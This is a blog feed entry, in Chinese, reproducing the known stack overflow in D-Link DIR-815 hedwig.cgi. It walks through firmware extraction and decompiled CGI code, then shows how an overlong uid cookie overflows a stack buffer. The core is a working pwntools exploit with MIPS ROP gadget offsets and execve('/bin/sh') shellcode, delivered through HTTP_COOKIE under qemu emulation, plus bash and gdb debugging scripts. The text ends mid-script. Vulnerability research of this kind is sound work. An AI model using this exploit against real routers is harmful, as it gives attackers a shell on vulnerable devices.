<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>😘Thir0th的喵喵杂货铺</title>
  
  
  <link href="https://www.thir0th.xyz/atom.xml" rel="self"/>
  
  <link href="https://www.thir0th.xyz/"/>
  <updated>2025-06-25T13:27:37.886Z</updated>
  <id>https://www.thir0th.xyz/</id>
  
  <author>
    <name>Thir0th</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DIR-815漏洞复现</title>
    <link href="https://www.thir0th.xyz/posts/cc98ab9a.html"/>
    <id>https://www.thir0th.xyz/posts/cc98ab9a.html</id>
    <published>2025-06-25T13:27:35.000Z</published>
    <updated>2025-06-25T13:27:37.886Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>DIR-815漏洞复现</h1><h2 id="固件分析">固件分析</h2><p>确定固件架构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /bin</span><br><span class="line">file busybox</span><br></pre></td></tr></table></figure><p>binwalk分离固件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me file</span><br></pre></td></tr></table></figure><p>mipsrop下载，ida9.0版本</p><p><a href="https://blog.csdn.net/XiDPPython/article/details/148194489?spm=1001.2014.3001.5501">IDA插件 MIPSROP的安装和使用方法_ida mips-CSDN博客</a></p><h2 id="漏洞点分析">漏洞点分析</h2><p>官方漏洞批漏：<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625">https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625</a></p><p><img src="https://s2.loli.net/2025/06/25/NXPMpyYfmH8kagV.png" alt="image"></p><p>官方的漏洞报告中只提及了DIR-645型号的hedwig.cgi中会存在缓冲区溢出的漏洞，其实D-Link的DIR-815/300/600/645等型号都存在这个漏洞</p><p>根据漏洞描述，可知漏洞点在hedwig.cgi，同时这个文件指向/htdocs/cgibin，这个就是我们要分析的二进制文件</p><p><img src="https://s2.loli.net/2025/06/25/dL5cTaJPbD1s6SI.png" alt="image"></p><p>main中定位主要函数</p><p><img src="https://s2.loli.net/2025/06/25/fFZXYv2eVouAKOB.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">// 函数入口，保存寄存器，分配栈空间，初始化局部变量。</span><br><span class="line">int hedwigcgi_main()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // $v0</span><br><span class="line">  const char *no_REQUEST; // $a1</span><br><span class="line">  FILE *stream; // $s0</span><br><span class="line">  int v3; // $fp</span><br><span class="line">  int v4; // $s5</span><br><span class="line">  int v5; // $v0</span><br><span class="line">  const char *string; // $v0</span><br><span class="line">  FILE *stream_1; // $s2</span><br><span class="line">  int fd; // $v0</span><br><span class="line">  int v9; // $s7</span><br><span class="line">  int fd_1; // $v0</span><br><span class="line">  char **v11; // $s1</span><br><span class="line">  int i; // $s3</span><br><span class="line">  char *v13; // $v0</span><br><span class="line">  const char **v14; // $s1</span><br><span class="line">  int v15; // $s0</span><br><span class="line">  char *v16; // $v0</span><br><span class="line">  const char **v17; // $s1</span><br><span class="line">  int v18; // $s0</span><br><span class="line">  int fd_2; // $v0</span><br><span class="line">  const char *v20; // $v0</span><br><span class="line">  char _runtime_session[20]; // [sp+18h] [-4A8h] BYREF</span><br><span class="line">  char *s_2; // [sp+2Ch] [-494h] BYREF</span><br><span class="line">  char *v24; // [sp+30h] [-490h]</span><br><span class="line">  _DWORD v25[3]; // [sp+34h] [-48Ch] BYREF</span><br><span class="line">  char s_1[128]; // [sp+40h] [-480h] BYREF</span><br><span class="line">  char s[1024]; // [sp+C0h] [-400h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(s, 0, sizeof(s));                      // memset(s, 0, sizeof(s)); 初始化1024字节缓冲区s为0。</span><br><span class="line">  memset(s_1, 0, sizeof(s_1));                  // memset(s_1, 0, sizeof(s_1)); 初始化128字节缓冲区s_1为0。</span><br><span class="line">  strcpy(_runtime_session, &quot;/runtime/session&quot;); // strcpy(_runtime_session, &quot;/runtime/session&quot;); 拷贝字符串到_runtime_session。</span><br><span class="line">  v0 = getenv(&quot;REQUEST_METHOD&quot;);                // v0 = getenv(&quot;REQUEST_METHOD&quot;); 获取环境变量REQUEST_METHOD，判断HTTP请求类型。</span><br><span class="line">  if ( !v0 )                                    // if (!v0) 检查REQUEST_METHOD是否存在，不存在则返回错误。</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;no REQUEST&quot;;</span><br><span class="line">LABEL_7:</span><br><span class="line">    v3 = 0;</span><br><span class="line">    v4 = 0;</span><br><span class="line">LABEL_34:</span><br><span class="line">    v9 = -1;</span><br><span class="line">    goto LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( strcasecmp(v0, &quot;POST&quot;) )                 // if (strcasecmp(v0, &quot;POST&quot;)) 检查是否为POST请求，非POST则返回错误。</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unsupported HTTP request&quot;;</span><br><span class="line">    goto LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  cgibin_parse_request(sub_409A6C, 0, 0x20000); // cgibin_parse_request(sub_409A6C, 0, 0x20000); 解析CGI请求数据。</span><br><span class="line">  stream = fopen(&quot;/etc/config/image_sign&quot;, &quot;r&quot;);// stream = fopen(&quot;/etc/config/image_sign&quot;, &quot;r&quot;); 打开签名配置文件。</span><br><span class="line">  if ( !fgets(s_1, 128, stream) )               // if (!fgets(s_1, 128, stream)) 读取签名内容，失败则返回错误。</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unable to read signature!&quot;;</span><br><span class="line">    goto LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);                               // fclose(stream); 关闭签名文件。</span><br><span class="line">  cgibin_reatwhite(s_1);                        // cgibin_reatwhite(s_1); 去除签名字符串中的空白字符。</span><br><span class="line">  v4 = sobj_new();                              // v4 = sobj_new(); 创建字符串对象v4。</span><br><span class="line">  v5 = sobj_new();                              // v5 = sobj_new(); 创建字符串对象v5。</span><br><span class="line">  v3 = v5;</span><br><span class="line">  if ( !v4 || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unable to allocate string object&quot;;</span><br><span class="line">    goto LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  sess_get_uid(v4);                             // sess_get_uid(v4); 获取当前会话的UID。</span><br><span class="line">  string = (const char *)sobj_get_string(v4);   // string = (const char *)sobj_get_string(v4); 获取UID字符串。</span><br><span class="line">  sprintf(s, &quot;%s/%s/postxml&quot;, &quot;/runtime/session&quot;, string);// sprintf(s, &quot;%s/%s/postxml&quot;, &quot;/runtime/session&quot;, string); 生成postxml路径。</span><br><span class="line">  xmldbc_del(0, 0, s);                          // xmldbc_del(0, 0, s); 删除旧的postxml节点。</span><br><span class="line">  stream_1 = fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;);   // stream_1 = fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;); 创建临时XML文件用于写入。</span><br><span class="line">  if ( !stream_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unable to open temp file.&quot;;</span><br><span class="line">    goto LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !haystack )                              // if (!haystack) 检查XML数据是否存在，不存在则返回错误。</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;no xml data.&quot;;</span><br><span class="line">    goto LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  fd = fileno(stream_1);                        // fd = fileno(stream_1); 获取文件描述符。</span><br><span class="line">  v9 = lockf(fd, 3, 0);                         // v9 = lockf(fd, 3, 0); 尝试对文件加锁，防止并发写入。</span><br><span class="line">  if ( v9 &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(</span><br><span class="line">      &quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;BUSY&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;&quot;,</span><br><span class="line">      0);</span><br><span class="line">    v9 = 0;</span><br><span class="line">    goto LABEL_26;</span><br><span class="line">  &#125;</span><br><span class="line">  fd_1 = fileno(stream_1);                      // fd_1 = fileno(stream_1); 再次获取文件描述符。</span><br><span class="line">  lockf(fd_1, 1, 0);</span><br><span class="line">  s_2 = s_1;</span><br><span class="line">  v24 = 0;</span><br><span class="line">  memset(v25, 0, sizeof(v25));</span><br><span class="line">  v24 = strtok(_runtime_session, &quot;/&quot;);</span><br><span class="line">  v11 = (char **)v25;</span><br><span class="line">  for ( i = 2; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = strtok(0, &quot;/&quot;);</span><br><span class="line">    *v11++ = v13;</span><br><span class="line">    if ( !v13 )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  (&amp;s_2)[i] = (char *)sobj_get_string(v4);</span><br><span class="line">  fputs(&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;, stream_1);</span><br><span class="line">  v14 = (const char **)&amp;s_2;</span><br><span class="line">  v15 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    ++v15;</span><br><span class="line">    fprintf(stream_1, &quot;&lt;%s&gt;\n&quot;, *v14++);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v15 &lt; i + 1 );</span><br><span class="line">  v16 = strstr(haystack, &quot;&lt;postxml&gt;&quot;);</span><br><span class="line">  fprintf(stream_1, &quot;%s\n&quot;, v16);</span><br><span class="line">  v17 = (const char **)&amp;(&amp;s_2)[i];</span><br><span class="line">  v18 = i + 1;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    --v18;</span><br><span class="line">    fprintf(stream_1, &quot;&lt;/%s&gt;\n&quot;, *v17--);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v18 &gt; 0 );</span><br><span class="line">  fflush(stream_1);</span><br><span class="line">  xmldbc_read(0, 2, &quot;/var/tmp/temp.xml&quot;);</span><br><span class="line">  fd_2 = fileno(stream_1);</span><br><span class="line">  lockf(fd_2, 0, 0);</span><br><span class="line">  fclose(stream_1);</span><br><span class="line">  remove(&quot;/var/tmp/temp.xml&quot;);</span><br><span class="line">  v20 = (const char *)sobj_get_string(v4);</span><br><span class="line">  sprintf(s, &quot;/htdocs/webinc/fatlady.php\nprefix=%s/%s&quot;, &quot;/runtime/session&quot;, v20);</span><br><span class="line">  xmldbc_ephp(0, 0, s, stdout);</span><br><span class="line">  if ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = 0;</span><br><span class="line">LABEL_25:</span><br><span class="line">    printf(</span><br><span class="line">      &quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;&quot;,</span><br><span class="line">      no_REQUEST);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">  if ( haystack )</span><br><span class="line">    free(haystack);</span><br><span class="line">  if ( v3 )</span><br><span class="line">    sobj_del(v3);</span><br><span class="line">  if ( v4 )</span><br><span class="line">    sobj_del(v4);</span><br><span class="line">  return v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getenv去检查环境变量，然后全检测是不是post传参</p><p><img src="https://s2.loli.net/2025/06/25/gSOcRiX7GE9Ptwy.png" alt="image"></p><p>cgibin_parse_request,函数中获取三个环境变量，这里参数的需要设置，并且有一定的要求</p><p><img src="https://s2.loli.net/2025/06/25/hxsnNQ3CGOiJa65.png" alt="image"></p><p>漏洞点就在sess_get_uid中</p><p><img src="https://s2.loli.net/2025/06/25/M46GJC5ljxdwPum.png" alt="image"></p><p>获取cookie环境变量，并解析，首先是检查cookie名是否是uid，然后将uid=后的ip给v4,而且没有限制，这里就存在栈溢出</p><p><img src="https://s2.loli.net/2025/06/25/JklKctPDY9o316X.png" alt="image"></p><p><img src="https://s2.loli.net/2025/06/25/7JuhMRvec3nsLOq.png" alt="image"></p><p>然后是将v4-&gt;string-&gt;s，但s只有0x400字节，然后就会溢出</p><p><img src="https://s2.loli.net/2025/06/25/9EP8C5nbxw1kN2s.png" alt="image"></p><p><img src="https://s2.loli.net/2025/06/25/mdaJZQGRfqxINB5.png" alt="image"></p><p>然后就是劫持程序流程，但实际上还需要绕过，也不是说绕过，参考正常pwn栈溢出的思路，我们肯定需要让程序执行完，然后才能执行到我们布置的rop链上，如何让程序能正常去执行</p><p>后续有两个要求</p><p>1./var/tmp/temp.xml存在</p><p>2.haystack != null</p><p>第一个只要我们不去破坏程序环境就不会出问题</p><p>关键是第二个，通过交叉引用我们发现控制haystack值的地方</p><p>这里实际上有两种处理方式，因为目的就是让程序走到我们的gadget上</p><p><code>1.CONTENT_TYPE=application/x-www-form-urlencoded</code>​</p><p>也是网上很多师傅分析的</p><p><img src="https://s2.loli.net/2025/06/25/Dw9IW2u7yEFzphx.png" alt="image"></p><p>sub_409a6c</p><p>每当cgibin_parse_request解析到一段需要处理的数据时，就会调用sub_409A6C，把数据交给它处理。这样，haystack就始终保存着最新的请求数据内容</p><p>正常执行的话haystack是不为空的</p><p><img src="https://s2.loli.net/2025/06/25/Fz97VW3J2osjtch.png" alt="image"></p><p>之后就是获取两个环境变量，REQUEST_URI/CONTENT_LENGTH</p><p><img src="https://s2.loli.net/2025/06/25/OR49Ba82KVeoWk1.png" alt="image"></p><p>主要是CONTENT_TYPE，会检测&quot;application/&quot;这个字符串，同时会跳转到一个地方，ida中是看不到的，我们可以下断点调试看看</p><p><img src="https://s2.loli.net/2025/06/25/iTPwgZ4tdMxH6Uq.png" alt="image"></p><p>这里返回的是0x403b10</p><p><img src="https://s2.loli.net/2025/06/25/OtCNcwfEqjxevDS.png" alt="image"></p><p>0x403b10</p><p><img src="https://s2.loli.net/2025/06/25/OaSB1Aeinbys27d.png" alt="image"></p><p>然后还是返回到0x409a6c，需要保证REQUEST_URI存在，然后程序就可以返回到我们布置好的rop上getshell</p><p><img src="https://s2.loli.net/2025/06/25/6NthXGRgPoWkmq1.png" alt="image"></p><p>‍</p><p><img src="https://s2.loli.net/2025/06/25/jXNTEeFgmsRuVq3.png" alt="image"></p><p><img src="https://s2.loli.net/2025/06/25/tQCJhLwnicBfbMV.png" alt="image"></p><p><img src="https://s2.loli.net/2025/06/25/N8qlbJ4EGxBaOjW.png" alt="image"></p><p>实际上我们可以<code>CONTENT_TYPE=任意</code>​，仅需设置post传参其他参数都不用控制,这样岂不是更简单</p><p>在sub_403B10不进入sub_402FFC,而是往下走，最后到sub_403794-&gt;cgibin_print_http_status</p><p>此时程序也可以走完，同时不触发报错，可以利用栈溢出漏洞，栈溢出的偏移不一样罢了</p><p><img src="https://s2.loli.net/2025/06/25/p15ULvBMFEmdVwJ.png" alt="image"></p><p><img src="https://s2.loli.net/2025/06/25/yPhiwu59nTZzDIq.png" alt="image"></p><p>偏移</p><p><img src="https://s2.loli.net/2025/06/25/bWHFCARkmw8GtMh.png" alt="image"></p><p>poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;--&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.arch=&#x27;mips&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(target=(&quot;127.0.0.1&quot;, 1234), exe=&quot;./htdocs/cgibin&quot;,</span><br><span class="line">               gdbscript=&quot;&quot;&quot;</span><br><span class="line">               b *0x409680\n    </span><br><span class="line">               c\n</span><br><span class="line">               &quot;&quot;&quot;)</span><br><span class="line">    pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">libc_base = 0x7f738000#local</span><br><span class="line">#libc_base = 0x77f34000 #remote</span><br><span class="line">payload=cyclic(0x1000)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*0x3cd</span><br><span class="line">payload += b&#x27;a&#x27;*(4+0x18+12-2)</span><br><span class="line">payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span><br><span class="line">payload += b&#x27;abcd&#x27;</span><br><span class="line">payload += p32(libc_base + 0x56BD0) # s3  sleep</span><br><span class="line">payload += cyclic(20)#b&#x27;a&#x27;*(4*5)</span><br><span class="line">payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=&gt; jalr $s1)</span><br><span class="line"> </span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += b&#x27;a&#x27;*(4*4)</span><br><span class="line">payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=&gt; jalr $t9)</span><br><span class="line">payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span><br><span class="line"> </span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">    slti $a2, $zero, -1</span><br><span class="line">    li $t7, 0x69622f2f</span><br><span class="line">    sw $t7, -12($sp)</span><br><span class="line">    li $t6, 0x68732f6e</span><br><span class="line">    sw $t6, -8($sp)</span><br><span class="line">    sw $zero, -4($sp)</span><br><span class="line">    la $a0, -12($sp)</span><br><span class="line">    slti $a1, $zero, -1</span><br><span class="line">    li $v0, 4011</span><br><span class="line">    syscall 0x40404</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&quot;uid=&quot; + payload</span><br><span class="line">post_content = &quot;Thir0th=Pwner&quot;</span><br><span class="line">p = process(b&quot;&quot;&quot;</span><br><span class="line">    qemu-mipsel -L ./ \</span><br><span class="line">    -0 &quot;hedwig.cgi&quot; \</span><br><span class="line">    -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\&quot; \</span><br><span class="line">    -g 1234 ./htdocs/cgibin</span><br><span class="line">&quot;&quot;&quot;, shell = True)</span><br><span class="line"></span><br><span class="line">bug()</span><br><span class="line">p.send(post_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>‍</p><p><img src="https://s2.loli.net/2025/06/25/e8sy2A41lq5aMwK.png" alt="image"></p><p>‍</p><h2 id="qemu用户态模拟">qemu用户态模拟</h2><p>这个比较简单，就跟本地调试异架构一样，但参数不一样</p><h3 id="直接gdb调试">直接gdb调试</h3><p>进入 <code>squashfs-root</code>​ 文件夹中，执行下列指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic 2000 &gt; payload</span><br></pre></td></tr></table></figure><p>init.sh脚本启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">INPUT=&quot;Thir0th=Pwner&quot;                       # 要发送的 POST 数据（可能是伪造登录</span><br><span class="line">或命令执行尝试）</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)         # 自动计算数据长度（Content-Length）</span><br><span class="line">COOKIE=&quot;uid=`cat payload`&quot;              # 从 payload 文件读取 cookie uid（模拟登</span><br><span class="line">录身份）</span><br><span class="line"></span><br><span class="line"># 使用 qemu-mipsel 启动 CGI 程序（绑定 GDB 调试端口 1234）</span><br><span class="line">echo $INPUT | qemu-mipsel -L ./ \</span><br><span class="line">  -0 &quot;hedwig.cgi&quot; \</span><br><span class="line">  -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">  -E CONTENT_LENGTH=$LEN \</span><br><span class="line">  -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">  -E HTTP_COOKIE=$COOKIE \</span><br><span class="line">  -E REQUEST_URI=&quot;2333&quot; \</span><br><span class="line">  -g 1234 \</span><br><span class="line">  ./htdocs/cgibin</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://mygdb.sh">mygdb.sh</a></p><p>gdb-multiarch -x <a href="http://mygdb.sh">mygdb.sh</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips                                     </span><br><span class="line">set follow-fork-mode child  </span><br><span class="line">set detach-on-fork off                                    </span><br><span class="line">target remote 127.0.0.1:1234</span><br><span class="line">file ./htdocs/cgibin</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>‍</p><h3 id="脚本调试">脚本调试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;--&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.arch=&#x27;mips&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(target=(&quot;127.0.0.1&quot;, 1234), 